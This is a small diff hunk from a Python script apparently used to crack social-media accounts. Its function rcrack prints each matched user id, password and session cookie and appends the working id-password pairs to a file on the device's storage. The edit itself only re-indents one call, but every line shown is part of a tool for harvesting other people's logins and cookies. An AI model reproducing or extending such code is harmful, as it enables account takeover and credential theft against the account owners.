@@ -289,7 +289,7 @@ def rcrack(uid,pwx,tl):
                 print('\033[1;34m[\033[\033[0;101mGIFT\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
                 os.system("play-audio m4.mp3")
                 print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
-               cek_apk(session,coki)
+                cek_apk(session,coki)
                 open('/sdcard/GIFT-OK💚.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid);cek_apk(coki)
                 break
